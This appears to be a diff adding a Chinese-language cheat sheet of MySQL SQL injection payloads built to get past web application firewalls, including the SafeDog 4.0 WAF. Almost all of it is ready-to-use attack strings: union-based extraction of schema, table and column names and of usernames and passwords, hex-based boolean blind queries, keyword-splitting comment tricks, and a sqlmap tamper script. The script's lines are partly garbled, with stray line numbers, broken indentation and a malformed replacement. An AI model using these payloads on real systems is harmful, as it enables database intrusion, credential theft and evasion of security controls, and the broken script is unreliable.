@@ -1,0 +1,181 @@
+一： and 1=1 和 and 1=2  绕过
+字符型+Mysql： 
+
+' and 1=1--+
+' and 1=2--+
+
+' and %26%26 True--+
+' and %26%26 False--+
+
+
+二：order by 绕过
+字符型+Mysql：
+ ' /*!order*//**//*!by*/ 1--+
+ 
+ ' order/*!60000ghtwf01*/by 1--+
+ 
+ 
+三： Union Select绕过
+ 字符型+Mysql：
+ ' union/*!60000ghtwf01*/select 1,2,3--+
+ 
+ ' union/*!60000ghtwf01*/select 1,database(),3--+
+ ' union/*!60000ghtwf01*/select 1,(database/**/()),3--+
+ 
+ 
+ 四：schema_name 绕过
+字符型+Mysql：
+' union/*!60000ghtwf01*/select 1, (select group_concat(/*!schema_name*/) from information_schema.schemata),3--+
+
+
+五：table_name 绕过 
+字符型+Mysql：
+' union/*!60000ghtwf01*/select 1,(select group_concat(/*!table_name*/) from information_schema.tables where table_schema='security'),3--+
+
+
+六： column_name 绕过
+字符型+Mysql：
+' union/*!60000ghtwf01*/select 1,(select group_concat(/*!column_name*/) from information_schema.columns where table_schema='security' %26%26 table_name=0x7573657273),3--+
+
+
+七：绕过与 from 的结合查询字段内容
+字符型+Mysql：
+' union/*!60000ghtwf01*/select 1, (select group_concat(username,0x7e,password,0x7e) from. users),3--+
+
+
+
+布尔盲注 --Mysql+字符型
+查询数据库名长度：
+' %26%26 length(database/**/())=8--+
+
+查询第一个数据库名的第一个字母，过滤了 ascii()，使用 hex()
+%27%20%26%26%20(hex(substr((select%20concat(/*!schema_name*/)%20from%20information_schema.schema
+ta%20limit%200,1),1,1))=69)%20--+
+
+查询表名的第一个字母，注意这里数据库名需要十六进制编码
+%27%20%26%26%20(hex(substr((select%20concat(/*!table_name*/)%20from%20information_schema.tables%
+20where%20/*!table_schema*/=0x7365637572697479%20limit%200,1),1,1))=65)%20--+
+
+查询列名的第一个字母
+%27%20%26%26%20(hex(substr((select%20concat(/*!column_name*/)%20from%20information_schema.column
+s%20where%20table_schema=0x7365637572697479%20%26%26%20table_name=0x7573657273%20limit%200,1),1,1))=
+69)%20--+
+
+查询字段第一个字母，限制了 select 与 from 结合使用 from.
+%27%20%26%26%20(hex(substr((select%20username%20from.%20users%20limit%200,1),1,1))=74)%20--+
+
+
+
+时间盲注
+过滤了 sleep() 函数，使用 benchmark() 函数
+
+
+
+ 
+奇怪的Payload
+字符型+Mysql
+爆数据库名：
+'-ghtwf01()--+
+ 
+ 
+
+
+ 
+ 
+ 安全狗-4.0
+ 字符型+Mysql
+ 一： and 1=1 
+ 常规：' and 1=1-- -
+ 
+ 逻辑&：
+ ' %26 1-- -
+  ' %26 0-- -
+ ' %26 true-- -
+ ' %26 false-- -
+  
+ xor绕过：
+ ' Xor 1-- -
+ ' Xor true-- -
+ 
+ ' or length(database()=4)-- -
+ ' %26 (length(database/**/())=4)-- -
+ ' %26 (ascii(@@version)=53)-- -
+ 
+ ' or -1=-1-- -
+ ' or -0=-0-- -
+ ' or /*!1=1*/-- -
+ 
+ and 和 or绕过
+ /*!11440OR*/
+ /*!11440AND*/
+ 
+ order by 绕过
+ order%23%0aby
+ ' /*!order /*!/*/**/by*/1-- -
+ ' /*!order /*/*%/**/by*/1-- -
+ ' /*!order /*!/*/**//**/by*/1-- -
+ ' /*!order /*!/*/**//*/**/by*/1-- -
+  /*!11440order*/
+  
+  union select绕过
+  ' /*!union/*!/*/**/*/select/**/1,2,3-- -
+ ' /*!11440union*/ /*!select/*!/*/**/*/-- -
+ 
+ 系统函数绕过
+ version () #直接空格
+ user%0a() #这个地方%0a~%20有很多，类似绕过空格
+ database/**/() #注释符
+ user/*!*/() #内敛注释
+
+ 函数名绕过
+ /*!extractvalue/*!/*/**/*/
+ /*!updatexml/*!/*/**/*/
+ 
+ information_schema.*绕过
+ Mysql>5.6.x Mysql>5.6.xmysql 库里增添了两个新表， 库里增添了两个新表，innodb_index_stats 和和 innodb_table_stats 这两个表是数据库自动设置的。 这两个表是数据库自动设置的。
+ 存储数据库和对应的数据表，安全狗没有对这两个表做检测
+
+万能payload
+#针对两个关键字连用或者函数 
+/*!union/*!/*/**/*/select/**/
+/*!database/*!/*/**/*/()/**/
+/*!order/*!/*/**/*/by/**/
+#针对单独的一个关键字 
+/*!union/*!/*/**/*/ 
+/*!updatexml/*!/*/**/*/ 
+/*!extractvalue/*!/*/**/*/
+
+tamper:
+#!/usr/bin/env python
+# -*- coding: UTF-8 -*-
+from lib.core.enums import PRIORITY
+from lib.core.settings import UNICODE_ENCODING
+
+__priority__ = PRIORITY.LOWEST
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+
+   if payload:
+      payload=payload.replace("=","/*!*/=/*!*/")
+      payload=payload.replace("ORDER","/*!ORDER/*!/*/**/*/")
+      payload=payload.replace("AND","/*!AND/*!/*/**/*/")
+      payload=payload.replace("OR","/*!OR/*!/*/**/*/")
+      payload=payload.replace("UNION","/*!UNION/*!/*/**/*/")
+      payload=payload.replace("SELECT","/*!SELECT/*!/*/**/*/")
+21    payload=payload.replace("USER()","/*!USER/*!/*/**/*/()/**/")
+22    payload=payload.replace("DATABASE()","/*!DATABASE/*!/*/**/*/()/**/")
+23    l payload=payload.replace("VERSION()","/*!VERSION/*!/*/**/*/()/**/")
+24 payload=payload.replace("SESSION_USER()","/*!SESSION_USER/*!/*/**/*/()/**/")
+25 payload=payload.replace("EXTRACTVALUE","/*!EXTRACTVALUE/*!/*/**/*/()/**/")
+26 payload=payload.replace("UPDATEXML","/*!UPDATEXML/*!/*/**/*/")
+27
+28 return payload
+ 
+ 
+ 
+ 
+
+
